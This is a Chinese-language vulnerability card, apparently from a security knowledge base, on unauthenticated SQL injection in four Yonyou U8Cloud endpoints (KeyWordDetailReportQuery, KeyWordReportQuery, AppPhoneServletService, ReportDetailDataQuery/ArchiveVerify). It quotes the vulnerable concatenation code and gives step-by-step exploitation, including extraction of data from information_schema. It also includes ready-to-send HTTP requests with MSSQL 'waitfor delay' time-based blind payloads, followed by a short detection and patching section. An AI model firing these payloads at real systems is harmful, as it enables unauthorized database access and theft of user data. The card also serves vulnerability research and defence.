---
id: web-java-component-yonyou-u8cloud-multi-service-sqli
title: 用友 U8Cloud 多接口 SQL 注入：KeyWord*ReportQuery、AppPhoneServletService、ReportDetailDataQuery、ArchiveVerify 参数拼接（MSSQL 时间盲注验证）
type: scenario
domain: web
path: web/java/component
technique: yonyou-u8cloud-service-sqli
aliases:
- 用友 U8Cloud SQL 注入
- U8Cloud KeyWordDetailReportQuery 注入
- KeyWordReportQuery 注入
- AppPhoneServletService 注入
- ReportDetailDataQuery 注入
- ArchiveVerify 注入
- u8cuapws archive verify 注入
- reportType 注入
- phone 参数注入
tags:
- java
- yonyou
- u8cloud
- sqli
- mssql
- servlet
- mobile-report
- archive
- unauthenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V613
  verified_at: '2026-11-12T19:55:25+08:00'
  notes: 已对照原文《用友U8Cloud 几个sql注入分析》通读全文并逐张核对 12 张图（img_small 最长边1200 JPEG，12/12 成功，无失败文件）：图01 KeyWordDetailReportQuery.doAction（Gson 解析、usercode 写死 18701014496、reportType 可控）与图02 queryReportDetailByCondition->executeQuery；图03 KeyWordReportQuery.doAction（pageInfo、queryFormDataByCondition）；图04 Burp POST KeyWordDetailReportQuery reportType=1';waitfor delay '0:0:3'-- 响应 3143ms；图05/06 补丁对 reportType 与 keywordPk/keywordValue 调用 SQLParamValidator.validate；图07 SQLParamValidator.validate 仅 !param.contains("'")；图08 AppPhoneServletService.doAction（accountCode 请求头、module/method/phone、getUserInfoByPhone）；图09 phone=1';waitfor delay '0:0:4'-- 响应 4268ms；图10 ReportDetailDataQuery formPK 取两遍（JSON 覆盖）->queryVO；图11 ArchiveVerify.doPost 取 orgInfo.code->queryGlOrgBookVO，且 orgInfo.code 在 if(YDBG) 分支之外；图12 POST /u8cuapws/rest/archive/verify orgInfo.code=1';waitfor delay '0:0:5'-- 响应 5063ms。核对：四个接口代码链、拼接点（reporttype/phone/b.mobile/reportformid/glorgbookcode）、payload 与实测延迟均与原文一致；cve=[] 正确；原文未写受影响版本，未设 affected_versions
    正确。修正一处：卡片原把 type=YDBG 写成 ArchiveVerify 触发前提，但原文代码中 orgInfo.code 在 YDBG 分支之外使用、PoC 也未带 type 即触发延迟，已改为非前提。去留：保留并 verify 通过。dedup：related 的 KSOA/NC65 为同厂商不同产品不同注入实现，U8Cloud ServiceDispatcher 两卡为反序列化/token 伪造而非 SQLi，均非同链；dup-scan 无涉及 pair；四个 wiki 链接均存在。未实际复现请求；frontmatter 无 sources/source_url（validator 禁止）。
---

## 一句话结论

用友 U8Cloud 的四个服务接口把请求参数直接拼进 SQL：`KeyWordDetailReportQuery`/`KeyWordReportQuery` 的 `reportType`（以及 `keyword` 数组的 pk/value）、`AppPhoneServletService` 的 `phone`、`ReportDetailDataQuery` 的 `reportid`、`ArchiveVerify` 的 `orgInfo.code`；四者均可在未认证情况下用 MSSQL `waitfor delay` 时间盲注验证（响应分别延迟约 3/4/5 秒），进而读取数据库数据、造成用户信息泄露。

## 原理

- **统一的入口特征**：这几处都是 U8Cloud 的 Servlet/服务适配器（`IHttpServletAdaptor` 等），通过 Gson 解析请求 JSON 或 `request.getParameter` 取参后进入业务方法；代码里把 `usercode` 直接写死为固定值（如 `18701014496`），没有真正的登录态校验，因此接口可未授权访问。
- **注入点 1：KeyWordDetailReportQuery / KeyWordReportQuery（reportType）**
  `doAction` 从 JSON 取 `reportType`（`versionint` 为 int，`words` 为 KeyWordVO 数组可控）后调用 `queryReportDetailByCondition` → `getDeatailReportSql`：
  ```java
  sb.append(" where ");
  sb.append(" userrep.usercode = '" + usercode + "'");
  sb.append(" and rep.reporttype = '" + reportType + "'");
  sb.append(" and rep.version = " + version);
  sb.append(" and " + keyWordSql);
  ```
  拼接后交给 `dao.executeQuery(sql, ...)` 执行；`reportType` 处的单引号可直接闭合并注入。`KeyWordReportQuery` 逻辑相同，只是多传 `pageInfo`（currentPageIndex/pageSize），走 `queryFormDataByCondition` 同一拼接链。
- **注入点 2：AppPhoneServletService（phone）**
  `doAction` 读取 `accountCode` 请求头（默认账套编码为 `U8cloud`）、`module`、`method`、`phone` 参数，要求 `module=sm` 且 `method=getUserInfoByPhone` 才会进入 `getUserInfoByPhone(phone)`；该方法把 phone 直接拼进：
  ```java
  "... where b.mobile = '" + phone + "'"
  ```
  随后 `BaseDAO.executeQuery` 执行，属于典型字符串拼接注入。
- **注入点 3：ReportDetailDataQuery（reportid）**
  `doAction` 先从 `request.getParameter("reportid")` 取 `formPK`，随后又用 JSON `requestMap.get("reportid")` 覆盖（同一参数取两遍，实际以 JSON 为准），再调用 `dataQuery.queryVO(formPK)`；`queryVO` → `formService.queryVOByPk(formid)` 构造条件：
  ```java
  String sql = " reportformid ='" + reportformid + "'";
  ```
  该条件传给 `retrieveByClause` → `buildSql(className, condition, fields)`，`buildSql` 只是把 `condition` 拼成 `WHERE <condition>` 后 `session.executeQuery`，没有任何绑定变量。
- **注入点 4：ArchiveVerify（orgInfo.code）**
  `web.xml` 把 `nc.ele.service.ArchiveVerify` 映射到 `/u8cuapws/rest/archive/verify`；`doPost` 解析 JSON 的 `verifyData`，取 `orgInfo.code` 为 `bookCode`，调用 `U8CPubTool.queryGlOrgBookVO(bookCode)`，其中：
  ```java
  baseDao.queryVOs(GlorgbookVO.class, " isnull(dr,0) = 0 and glorgbookcode = '" + orgbookCode + "'")
  ```
  继续 `queryVOs` → `manager.queryVOList` → `queryVOList` → `buildSql` 拼接执行，同样可注入。
- **为什么成立**：四处共同根因是“把外部输入直接字符串拼进 SQL + 无参数化/预编译”，且这些内部服务接口没有统一鉴权；`buildSql` 仅负责拼 `WHERE`，不是防护。原文 PoC 使用 MSSQL 的 `waitfor delay '0:0:N'`，响应时间与延迟一致，证明注入语句确实进入数据库执行。
- **补丁思路**：厂商补丁对 `reportType`、`keyword` 的 pk/value、`reportid`、`phone`、`orgbookCode` 增加校验或改为参数化查询（`SQLParamValidator.validate` 仅检查是否包含单引号；`ArchiveVerify` 修复版改为 `retrieveByClause(..., "glorgbookcode = ?", param)` 绑定参数）。

## 触发条件

- 目标为用友 U8Cloud，存在对应服务且可从攻击者网络访问；路由支持 `/service/~iufo/...`、`/service/~ic/...`、`/service/~erm/...` 等，`service` 也可换成 `servlet`。
- 后端数据库为 Microsoft SQL Server（原文 PoC 使用 `waitfor delay`；其他数据库需换对应时间盲注/回显语法）。
- 接口未做统一鉴权：代码直接把 usercode 写死，未要求有效会话。
- `KeyWord*ReportQuery` 需要 JSON 中的 `reportType` 可控；`AppPhoneServletService` 需要 `accountCode: U8cloud`、`module=sm`、`method=getUserInfoByPhone`；`ReportDetailDataQuery` 需要 `reportid`；`ArchiveVerify` 需要 JSON 中 `orgInfo.code` 可控（`type=YDBG` 只影响账期处理分支，不是进入 `queryGlOrgBookVO` 的前提；原文 PoC 未带 type 仍触发延迟）。

## 利用步骤

1. **指纹确认**：识别 U8Cloud 登录页/静态资源；尝试访问 `/service/~iufo/...`、`/u8cuapws/rest/archive/verify` 等服务路径，观察是否返回业务 JSON 而非登录跳转。
2. **验证 KeyWordDetailReportQuery**：POST JSON `{"reportType":"1';waitfor delay '0:0:3'-- ","keyword":[]}`，观察响应时间约 3 秒；用 `~ic` 路由或 `servlet` 路由可复用同一 payload。
3. **验证 KeyWordReportQuery**：同一 `reportType` payload，额外带 `"pageInfo":{"currentPageIndex":1,"pageSize":1}`。
4. **验证 AppPhoneServletService**：请求头 `accountCode: U8cloud`，表单 `module=sm&method=getUserInfoByPhone&phone=1';waitfor delay '0:0:4'-- `，观察约 4 秒延迟。
5. **验证 ReportDetailDataQuery**：POST `/service/~iufo/nc.itf.iufo.mobilereport.data.ReportDetailDataQuery`，JSON `{"reportid":"1';waitfor delay '0:0:4'--"}`。
6. **验证 ArchiveVerify**：POST `/u8cuapws/rest/archive/verify`，JSON `{"orgInfo":{"code":"1';waitfor delay '0:0:5'--"}}`，观察约 5 秒延迟。
7. **数据提取**：确认可注入后，按 MSSQL 语法改用布尔/联合/报错或子查询逐位读取 `information_schema`/用户表；若数据库账户权限高，可进一步尝试堆叠查询（视驱动与权限）。原文只演示了时间盲注验证，数据提取未展开。

## PoC

```http
POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

{"reportType":"1';waitfor delay '0:0:3'-- ","keyword":[]}
```

```http
POST /service/~ic/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

{"reportType":"1';waitfor delay '0:0:3'-- ","keyword":[]}
```

```http
POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

{"reportType":"1';waitfor delay '0:0:3'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
```

```http
POST /service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService HTTP/1.1
Host: target
accountCode: U8cloud
Content-Type: application/x-www-form-urlencoded

module=sm&method=getUserInfoByPhone&phone=1';waitfor delay '0:0:4'-- 
```

```http
POST /service/~iufo/nc.itf.iufo.mobilereport.data.ReportDetailDataQuery HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

{"reportid":"1';waitfor delay '0:0:4'--"}
```

```http
POST /u8cuapws/rest/archive/verify HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

{"orgInfo":{"code":"1';waitfor delay '0:0:5'--"}}
```

原文 Burp 回显：KeyWordDetailReportQuery 响应约 3143ms、AppPhoneServletService 约 4268ms、ArchiveVerify 约 5063ms，与 payload 中延迟一致；ReportDetailDataQuery 给出同型 payload（未贴响应时间截图）。

## 变体与关联

- **路由变体**：同一服务可用 `/~iufo/`、`/~ic/` 前缀，`service` 可替换为 `servlet`；不同模块/账套还需匹配对应 `accountCode`（如 `U8cloud`）。
- **参数变体**：`KeyWord*ReportQuery` 的 `keyword` 数组元素（`keywordPk`/`keywordValue`）也进入 `getSqlByKeyword` 拼接，与 `reportType` 同属注入面；补丁同时校验了两者。
- **数据库变体**：原文 PoC 为 MSSQL 时间盲注；若目标数据库不同，需要改用对应的延迟/报错/联合语法，但拼接根因相同。
- **关联**：同厂商其他产品注入见 [[web-java-component-yonyou-nc65-mtapptimeline-doapply-sqli]]（NC6.5 Oracle OOB）与 [[web-java-component-yonyou-ksoa-unauth-jsp-sqli-multi-endpoint]]（KSOA MSSQL）；U8Cloud 其他漏洞见 [[web-java-component-yonyou-u8cloud-nccloudgateway-20250924-patch-hmac-auth-bypass]]、[[web-java-component-yonyou-u8cloud-servicedispatcher-patch-bypass-token-upload]]。
- **修复绕过提示**：补丁使用 `SQLParamValidator.validate`（仅检查 `'`）或参数化；前者只拦单引号，若上游存在其他编码/注入上下文需要另行评估，但原文未给出绕过 PoC，实战中应以升级官方补丁为准。

## 检测与防御

- **检测**：WAF/流量监控 `KeyWordDetailReportQuery`、`KeyWordReportQuery`、`AppPhoneServletService`、`ReportDetailDataQuery`、`/u8cuapws/rest/archive/verify` 等路径的请求体中出现 `waitfor`、`delay`、`union`、`select`、`information_schema`、`'` 等组合；同一来源对这些服务的高频探测与响应时间异常（时间盲注）。数据库审计关注异常 `WAITFOR`/长事务。
- **防御**：升级用友官方安全补丁；所有 SQL 改为参数化查询/绑定变量（`buildSql` 的 condition 不能直接拼接）；内部服务接口加统一鉴权，不要依赖写死的 usercode；数据库账户最小权限、关闭不必要的堆叠查询能力；WAF 规则仅作缓解。
- **排查**：若日志出现上述服务路径带引号/延迟语句的请求，应按已失陷排查：确认数据库是否被读取、是否存在 webshell/内存马等后续动作。
